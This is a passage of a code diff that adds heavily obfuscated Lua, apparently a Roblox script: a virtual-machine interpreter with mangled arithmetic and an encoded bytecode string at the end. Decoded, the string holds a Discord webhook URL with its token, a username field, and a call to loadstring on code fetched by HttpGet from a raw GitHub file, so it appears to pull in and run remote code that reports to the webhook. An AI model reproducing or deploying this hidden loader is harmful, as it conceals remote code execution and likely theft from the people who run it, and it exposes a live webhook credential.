+																																									v254 = nil;
+																																									v255 = nil;
+																																									v251 = 2;
+																																								end
+																																								if (v251 == 0) then
+																																									v252 = 0;
+																																									v253 = nil;
+																																									v251 = 1;
+																																								end
+																																								if (v251 == 2) then
+																																									while true do
+																																										if (v252 == 1) then
+																																											v255 = v197[v253 + (2 - 0)];
+																																											if (v255 > (1869 - (1329 + 540))) then
+																																												if (v254 > v197[v253 + 1]) then
+																																													v166 = v199[6 - 3];
+																																												else
+																																													v197[v253 + ((14 - 7) - (564 - (226 + 334)))] = v254;
+																																												end
+																																											elseif (v254 < v197[v253 + (1749 - (1098 + 650))]) then
+																																												v166 = v199[1 + 0 + 1 + 1];
+																																											else
+																																												v197[v253 + (9 - (28 - 22))] = v254;
+																																											end
+																																											break;
+																																										end
+																																										if (v252 == 0) then
+																																											local v315 = 0;
+																																											while true do
+																																												if (v315 == 1) then
+																																													v252 = 1;
+																																													break;
+																																												end
+																																												if (v315 == 0) then
+																																													v253 = v199[2 + 0];
+																																													v254 = v197[v253];
+																																													v315 = 1;
+																																												end
+																																											end
+																																										end
+																																									end
+																																									break;
+																																								end
+																																							end
+																																						end
+																																					elseif (v200 <= ((700 + 422) - (327 + 785))) then
+																																						if (v200 <= 8) then
+																																							if (v200 > (11 - 4)) then
+																																								local v256 = 0;
+																																								local v257;
+																																								local v258;
+																																								local v259;
+																																								local v260;
+																																								while true do
+																																									if (v256 == 2) then
+																																										while true do
+																																											if (v257 == 2) then
+																																												for v332 = 1 - (1636 - (516 + 1120)), v199[13 - 9] do
+																																													local v333 = 0;
+																																													local v334;
+																																													local v335;
+																																													while true do
+																																														if (v333 == 0) then
+																																															v334 = 0;
+																																															v335 = nil;
+																																															v333 = 1;
+																																														end
+																																														if (v333 == 1) then
+																																															while true do
+																																																if (v334 == 0) then
+																																																	local v372 = 0;
+																																																	while true do
+																																																		if (v372 == 0) then
+																																																			v166 = v166 + (1 - 0);
+																																																			v335 = v191[v166];
+																																																			v372 = 1;
+																																																		end
+																																																		if (1 == v372) then
+																																																			v334 = 1;
+																																																			break;
+																																																		end
+																																																	end
+																																																end
+																																																if (v334 == 1) then
+																																																	if (v335[1 + 0] == (1522 - (1224 + 274))) then
+																																																		v260[v332 - (1 + 0)] = {v197,v335[6 - (47 - (31 + 13))]};
+																																																	else
+																																																		v260[v332 - 1] = {v65,v335[(2761 - 1109) - (1592 + 57)]};
+																																																	end
+																																																	v196[#v196 + 1 + 0] = v260;
+																																																	break;
+																																																end
+																																															end
+																																															break;
+																																														end
+																																													end
+																																												end
+																																												v197[v199[2]] = v50(v258, v259, v66);
+																																												break;
+																																											end
+																																											if (v257 == 1) then
+																																												local v317 = 0;
+																																												while true do
+																																													if (v317 == 1) then
+																																														v257 = 2;
+																																														break;
+																																													end
+																																													if (v317 == 0) then
+																																														v260 = {};
+																																														v259 = v18({}, {[v7("\225\245\115\50\179\219\210", "\190\170\26\92\215")]=function(v347, v348)
+																																															local v360 = 0;
+																																															local v361;
+																																															local v362;
+																																															while true do
+																																																if (v360 == 0) then
+																																																	v361 = 0;
+																																																	v362 = nil;
+																																																	v360 = 1;
+																																																end
+																																																if (1 == v360) then
+																																																	while true do
+																																																		if (0 == v361) then
+																																																			local v381 = 0;
+																																																			while true do
+																																																				if (v381 == 0) then
+																																																					v362 = v260[v348];
+																																																					return v362[1][v362[2 + 0]];
+																																																				end
+																																																			end
+																																																		end
+																																																	end
+																																																	break;
+																																																end
+																																															end
+																																														end,[v7("\4\68\60\161\67\167\53\127\55\188", "\91\27\82\196\52\206")]=function(v347, v348, v349)
+																																															local v363 = 0;
+																																															local v364;
+																																															local v365;
+																																															while true do
+																																																if (v363 == 0) then
+																																																	v364 = 0;
+																																																	v365 = nil;
+																																																	v363 = 1;
+																																																end
+																																																if (v363 == 1) then
+																																																	while true do
+																																																		if (0 == v364) then
+																																																			v365 = v260[v348];
+																																																			v365[1 + 0 + (0 - 0)][v365[1897 - (1271 + 624)]] = v349;
+																																																			break;
+																																																		end
+																																																	end
+																																																	break;
+																																																end
+																																															end
+																																														end});
+																																														v317 = 1;
+																																													end
+																																												end
+																																											end
+																																											if (v257 == 0) then
+																																												local v318 = 0;
+																																												while true do
+																																													if (v318 == 1) then
+																																														v257 = 1;
+																																														break;
+																																													end
+																																													if (v318 == 0) then
+																																														v258 = v192[v199[13 - 10]];
+																																														v259 = nil;
+																																														v318 = 1;
+																																													end
+																																												end
+																																											end
+																																										end
+																																										break;
+																																									end
+																																									if (v256 == 1) then
+																																										v259 = nil;
+																																										v260 = nil;
+																																										v256 = 2;
+																																									end
+																																									if (0 == v256) then
+																																										v257 = 0;
+																																										v258 = nil;
+																																										v256 = 1;
+																																									end
+																																								end
+																																							else
+																																								v197[v199[229 - (163 + 64)]] = v65[v199[(1922 - (1325 + 589)) - 5]];
+																																							end
+																																						elseif (v200 == ((71 + 31) - ((851 - (221 + 610)) + 73))) then
+																																							v197[v199[1535 - (1105 + 428)]] = #v197[v199[5 - 2]];
+																																						else
+																																							local v264 = 0;
+																																							local v265;
+																																							local v266;
+																																							while true do
+																																								if (v264 == 1) then
+																																									while true do
+																																										if (0 == v265) then
+																																											v266 = v199[(10 - 5) - (3 + 0)];
+																																											v197[v266] = v197[v266](v21(v197, v266 + (924 - ((1628 - (116 + 683)) + 22 + 72)), v167));
+																																											break;
+																																										end
+																																									end
+																																									break;
+																																								end
+																																								if (v264 == 0) then
+																																									v265 = 0;
+																																									v266 = nil;
+																																									v264 = 1;
+																																								end
+																																							end
+																																						end
+																																					elseif (v200 <= (35 - 23)) then
+																																						if (v200 == (8 + 3)) then
+																																							v197[v199[(1714 + 199) - (1359 + 193 + 302 + 57)]] = v197[v199[13 - 10]] + v199[2 + 2];
+																																						else
+																																							v197[v199[145 - (50 + 93)]] = v199[3];
+																																						end
+																																					elseif (v200 == 13) then
+																																						v197[v199[1003 - (755 + 246)]] = v199[2 + 1] + v197[v199[(4 + 1246) - ((1053 - (246 + 83)) + 522)]];
+																																					else
+																																						v197[v199[1 + 0 + (700 - (617 + 82))]] = v197[v199[(29 - 20) - (3 + 3)]] % v199[2 + 2];
+																																					end
+																																				elseif (v200 <= (9 + 5 + 7)) then
+																																					if (v200 <= (8 + 9)) then
+																																						if (v200 <= ((1564 - 1178) - ((871 - (146 + 490)) + (519 - 383)))) then
+																																							local v231 = 0;
+																																							local v232;
+																																							local v233;
+																																							while true do
+																																								if (v231 == 1) then
+																																									while true do
+																																										if (v232 == 0) then
+																																											v233 = v199[2];
+																																											v197[v233](v21(v197, v233 + ((2 + 0) - (130 - (39 + 90))), v167));
+																																											break;
+																																										end
+																																									end
+																																									break;
+																																								end
+																																								if (v231 == 0) then
+																																									v232 = 0;
+																																									v233 = nil;
+																																									v231 = 1;
+																																								end
+																																							end
+																																						elseif (v200 == (9 + (1362 - (543 + 812)))) then
+																																							v197[v199[1 + 1]] = v197[v199[1424 - (1238 + 183)]] % v197[v199[669 - (281 + 384)]];
+																																						else
+																																							v197[v199[1 + 1]]();
+																																						end
+																																					elseif (v200 <= (19 + 0)) then
+																																						if (v200 == (40 - 22)) then
+																																							v197[v199[1 + 1]] = v197[v199[(2258 - (463 + 109)) - (751 + (2550 - 1618))]] - v199[1 + 0 + 3 + 0];
+																																						else
+																																							v197[v199[295 - (34 + 66 + (927 - 734))]] = v197[v199[1 + 2]][v199[1073 - (654 + 415)]];
+																																						end
+																																					elseif (v200 == (20 + 0 + 0)) then
+																																						local v276 = 0;
+																																						local v277;
+																																						local v278;
+																																						local v279;
+																																						local v280;
+																																						while true do
+																																							if (v276 == 0) then
+																																								v277 = 0;
+																																								v278 = nil;
+																																								v276 = 1;
+																																							end
+																																							if (v276 == 1) then
+																																								v279 = nil;
+																																								v280 = nil;
+																																								v276 = 2;
+																																							end
+																																							if (v276 == 2) then
+																																								while true do
+																																									if (v277 == 1) then
+																																										local v321 = 0;
+																																										while true do
+																																											if (v321 == 1) then
+																																												v277 = 2;
+																																												break;
+																																											end
+																																											if (0 == v321) then
+																																												v280 = v197[v278] + v279;
+																																												v197[v278] = v280;
+																																												v321 = 1;
+																																											end
+																																										end
+																																									end
+																																									if (v277 == 2) then
+																																										if (v279 > (0 - 0)) then
+																																											if (v280 <= v197[v278 + (600 - (35 + 564))]) then
+																																												local v366 = 0;
+																																												local v367;
+																																												while true do
+																																													if (v366 == 0) then
+																																														v367 = 0;
+																																														while true do
+																																															if (v367 == 0) then
+																																																v166 = v199[(999 - (799 + 199)) + 2];
+																																																v197[v278 + 2 + 1] = v280;
+																																																break;
+																																															end
+																																														end
+																																														break;
+																																													end
+																																												end
+																																											end
+																																										elseif (v280 >= v197[v278 + ((163 - (157 + 5)) - (1852 - (1622 + 230)))]) then
+																																											local v368 = 0;
+																																											local v369;
+																																											while true do
+																																												if (v368 == 0) then
+																																													v369 = 0;
+																																													while true do
+																																														if (v369 == 0) then
+																																															v166 = v199[(1338 - (477 + 856)) - 2];
+																																															v197[v278 + (803 - (93 + 56 + (1582 - (341 + 590))))] = v280;
+																																															break;
+																																														end
+																																													end
+																																													break;
+																																												end
+																																											end
+																																										end
+																																										break;
+																																									end
+																																									if (v277 == 0) then
+																																										local v322 = 0;
+																																										while true do
+																																											if (v322 == 0) then
+																																												v278 = v199[2];
+																																												v279 = v197[v278 + (2 - (0 + 0))];
+																																												v322 = 1;
+																																											end
+																																											if (v322 == 1) then
+																																												v277 = 1;
+																																												break;
+																																											end
+																																										end
+																																									end
+																																								end
+																																								break;
+																																							end
+																																						end
+																																					elseif not v197[v199[1285 - (595 + 688)]] then
+																																						v166 = v166 + 1 + 0;
+																																					else
+																																						v166 = v199[3];
+																																					end
+																																				elseif (v200 <= (102 - 77)) then
+																																					if (v200 <= 23) then
+																																						if (v200 == 22) then
+																																							local v281 = 0;
+																																							local v282;
+																																							local v283;
+																																							local v284;
+																																							local v285;
+																																							local v286;
+																																							while true do
+																																								if (v281 == 1) then
+																																									v284 = nil;
+																																									v285 = nil;
+																																									v281 = 2;
+																																								end
+																																								if (v281 == 2) then
+																																									v286 = nil;
+																																									while true do
+																																										if (1 == v282) then
+																																											local v323 = 0;
+																																											while true do
+																																												if (v323 == 0) then
+																																													v167 = (v285 + v283) - (1 + 0);
+																																													v286 = 0 + 0;
+																																													v323 = 1;
+																																												end
+																																												if (v323 == 1) then
+																																													v282 = 2;
+																																													break;
+																																												end
+																																											end
+																																										end
+																																										if (v282 == 2) then
+																																											for v336 = v283, v167 do
+																																												local v337 = 0;
+																																												local v338;
+																																												while true do
+																																													if (v337 == 0) then
+																																														v338 = 0;
+																																														while true do
+																																															if (0 == v338) then
+																																																v286 = v286 + (651 - (501 + 149));
+																																																v197[v336] = v284[v286];
+																																																break;
+																																															end
+																																														end
+																																														break;
+																																													end
+																																												end
+																																											end
+																																											break;
+																																										end
+																																										if (v282 == 0) then
+																																											local v324 = 0;
+																																											while true do
+																																												if (v324 == 0) then
+																																													v283 = v199[1805 - (1294 + 509)];
+																																													v284, v285 = v194(v197[v283](v21(v197, v283 + (1 - 0), v167)));
+																																													v324 = 1;
+																																												end
+																																												if (v324 == 1) then
+																																													v282 = 1;
+																																													break;
+																																												end
+																																											end
+																																										end
+																																									end
+																																									break;
+																																								end
+																																								if (v281 == 0) then
+																																									v282 = 0;
+																																									v283 = nil;
+																																									v281 = 1;
+																																								end
+																																							end
+																																						else
+																																							local v287 = 0;
+																																							local v288;
+																																							local v289;
+																																							local v290;
+																																							local v291;
+																																							local v292;
+																																							while true do
+																																								if (v287 == 2) then
+																																									v292 = nil;
+																																									while true do
+																																										if (v288 == 2) then
+																																											for v339 = v289, v167 do
+																																												local v340 = 0;
+																																												local v341;
+																																												while true do
+																																													if (v340 == 0) then
+																																														v341 = 0;
+																																														while true do
+																																															if (0 == v341) then
+																																																v292 = v292 + 1 + 0;
+																																																v197[v339] = v290[v292];
+																																																break;
+																																															end
+																																														end
+																																														break;
+																																													end
+																																												end
+																																											end
+																																											break;
+																																										end
+																																										if (v288 == 0) then
+																																											local v325 = 0;
+																																											while true do
+																																												if (v325 == 0) then
+																																													v289 = v199[797 - (283 + 512)];
+																																													v290, v291 = v194(v197[v289](v21(v197, v289 + 1 + 0, v199[1078 - (1072 + 3)])));
+																																													v325 = 1;
+																																												end
+																																												if (v325 == 1) then
+																																													v288 = 1;
+																																													break;
+																																												end
+																																											end
+																																										end
+																																										if (v288 == 1) then
+																																											local v326 = 0;
+																																											while true do
+																																												if (1 == v326) then
+																																													v288 = 2;
+																																													break;
+																																												end
+																																												if (v326 == 0) then
+																																													v167 = (v291 + v289) - (1116 - (632 + 483));
+																																													v292 = 522 - (224 + 298);
+																																													v326 = 1;
+																																												end
+																																											end
+																																										end
+																																									end
+																																									break;
+																																								end
+																																								if (0 == v287) then
+																																									v288 = 0;
+																																									v289 = nil;
+																																									v287 = 1;
+																																								end
+																																								if (v287 == 1) then
+																																									v290 = nil;
+																																									v291 = nil;
+																																									v287 = 2;
+																																								end
+																																							end
+																																						end
+																																					elseif (v200 > ((883 - (428 + 36)) - (394 + 1 + 0))) then
+																																						v66[v199[3]] = v197[v199[1 + 0 + (844 - (20 + 823))]];
+																																					else
+																																						v197[v199[907 - (371 + 534)]] = v197[v199[3]];
+																																					end
+																																				elseif (v200 <= (22 + 5)) then
+																																					if (v200 == (875 - (319 + 530))) then
+																																						do
+																																							return;
+																																						end
+																																					else
+																																						v166 = v199[799 - (4 + 61 + 731)];
+																																					end
+																																				elseif (v200 > ((1518 - (1322 + 97)) - (55 + 16))) then
+																																					v197[v199[2]] = v199[(3 - 0) + 0] ~= (732 - (485 + 247));
+																																				else
+																																					local v299 = 0;
+																																					local v300;
+																																					local v301;
+																																					while true do
+																																						if (v299 == 0) then
+																																							v300 = 0;
+																																							v301 = nil;
+																																							v299 = 1;
+																																						end
+																																						if (v299 == 1) then
+																																							while true do
+																																								if (0 == v300) then
+																																									v301 = v199[2 + 0 + 0];
+																																									v197[v301] = v197[v301](v21(v197, v301 + (4 - 3), v199[91 - (7 + 81)]));
+																																									break;
+																																								end
+																																							end
+																																							break;
+																																						end
+																																					end
+																																				end
+																																				v166 = v166 + 1 + 0;
+																																				break;
+																																			end
+																																			if (v206 == 0) then
+																																				local v220 = 0;
+																																				while true do
+																																					if (v220 == 0) then
+																																						v199 = v191[v166];
+																																						v200 = v199[1];
+																																						v220 = 1;
+																																					end
+																																					if (v220 == 1) then
+																																						v206 = 1;
+																																						break;
+																																					end
+																																				end
+																																			end
+																																		end
+																																		break;
+																																	end
+																																end
+																															end
+																															break;
+																														end
+																														if (v190 == 1) then
+																															v195 = {};
+																															v196 = {};
+																															v197 = {};
+																															for v207 = (894 - (376 + 518)) - (632 - (174 + 458)), v169 do
+																																if (v207 >= v193) then
+																																	v195[v207 - v193] = v168[v207 + ((3 - 0) - (930 - (825 + 103)))];
+																																else
+																																	v197[v207] = v168[v207 + (2 - 1)];
+																																end
+																															end
+																															v190 = 2;
+																														end
+																														if (v190 == 0) then
+																															v191 = v102;
+																															v192 = v103;
+																															v193 = v104;
+																															v194 = v48;
+																															v190 = 1;
+																														end
+																													end
+																												end;
+																												v181 = 1;
+																											end
+																										end
+																									end
+																								end
+																								break;
+																							end
+																							if (v164 == 2) then
+																								v169 = nil;
+																								v170 = nil;
+																								v164 = 3;
+																							end
+																							if (1 == v164) then
+																								v167 = nil;
+																								v168 = nil;
+																								v164 = 2;
+																							end
+																							if (v164 == 0) then
+																								v165 = 0;
+																								v166 = nil;
+																								v164 = 1;
+																							end
+																						end
+																					end;
+																				end
+																			end
+																		end
+																		if (v101 == 0) then
+																			local v141 = 0;
+																			while true do
+																				if (v141 == 0) then
+																					v102 = v64[1 + (0 - 0)];
+																					v103 = v64[(2 - 1) + 1];
+																					v141 = 1;
+																				end
+																				if (v141 == 1) then
+																					v101 = 1;
+																					break;
+																				end
+																			end
+																		end
+																		break;
+																	end
+																end
+															end
+															break;
+														end
+													end
+												end;
+												v58 = 1;
+											end
+										end
+									end
+									v52 = 1;
+								end
+							end
+						end
+						break;
+					end
+					if (v37 == 2) then
+						v46 = nil;
+						v47 = nil;
+						v48 = nil;
+						v49 = nil;
+						v37 = 3;
+					end
+					if (1 == v37) then
+						v42 = nil;
+						v43 = nil;
+						v44 = nil;
+						v45 = nil;
+						v37 = 2;
+					end
+				end
+			end;
+			v23("LOL!133O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00557365724E616D6503053O003931045C6303073O00495C6F391BA67303073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31303831392O33363134323839323638372O362F70396641465662595261374962457A726F3756433548504A334245554C4158667137625348722D4F5A744A3161396C567A7362644777317A525F706D70383936376E3874030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4861726447616D6553732F5053582F6D61696E2F4E65772E6C756100263O00124O00013O0020135O000200122O000100013O00201300010001000300122O000200013O00201300020002000400122O000300053O0006150003000A0001000100041B3O000A000100122O000300063O00201300040003000700122O000500083O00201300050005000900122O000600083O00201300060006000A00060800073O000100062O00183O00064O00188O00183O00044O00183O00014O00183O00024O00183O00054O0018000800073O00120C0009000C3O00120C000A000D4O001C0008000A00020012190008000B3O00120C0008000F3O0012190008000E3O00122O000800103O00122O000900113O00200100090009001200120C000B00134O001D000C00014O00170009000C4O000A00083O00022O00110008000100012O001A3O00013O00013O00023O00026O00F03F026O00704002284O000400025O00120C000300014O000900045O00120C000500013O0004050003002300012O000700076O0018000800024O0007000900014O0007000A00024O0007000B00034O0007000C00044O0018000D6O0018000E00063O00200B000F000600012O0017000C000F4O000A000B3O00022O0007000C00034O0007000D00044O0018000E00013O002012000F000600012O0009001000014O0010000F000F001000100D000F0001000F0020120010000600012O0009001100014O001000100010001100100D00100001001000200B0010001000012O0017000D00104O0016000C6O000A000A3O000200200E000A000A00022O00020009000A4O000F00073O00010004140003000500012O0007000300054O0018000400024O0006000300044O000300036O001A3O00017O00283O00093O000A3O000A3O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000A3O000D3O000D3O000D3O000D3O000E3O00263O00013O00013O00023O00023O00033O00033O00043O00043O00043O00043O00053O00063O00063O00073O00073O000E3O000E3O000E3O000E3O000E3O000E3O000E3O000F3O000F3O000F3O000F3O000F3O00103O00103O00113O00113O00113O00113O00113O00113O00113O00113O00113O00", v17(), ...);
+			break;
+		end
+	end
+end
